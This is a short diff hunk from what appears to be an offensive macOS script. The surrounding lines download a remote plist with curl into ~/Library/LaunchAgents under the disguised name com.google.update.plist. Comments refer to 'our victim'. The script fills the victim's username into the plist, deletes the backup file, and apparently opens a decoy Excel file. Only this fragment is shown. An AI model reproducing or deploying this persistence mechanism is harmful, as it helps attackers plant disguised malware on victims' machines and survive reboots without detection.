@@ -43,9 +43,10 @@ curl -s -k $PLISTURL -o ~/Library/LaunchAgents/com.google.update.plist
 
 # We need to replace the 'word' string in your plist file with correct username of our victim.
 # In this case my original hosted plist file string contains the 'replaceme' string
-# Remember that using sed on OSX will use BSD mode. So u need a backup file that we'll remove
+# Remember that using sed on OSX will use BSD mode. So u need a backup file
 USERNAME=$(whoami)
 sed -i .bak "s/replaceme/$USERNAME/g" ~/Library/LaunchAgents/com.google.update.plist
+# Remove backup file
 rm ~/Library/LaunchAgents/com.google.update.plist.bak
 
 # Download and open a real file excel
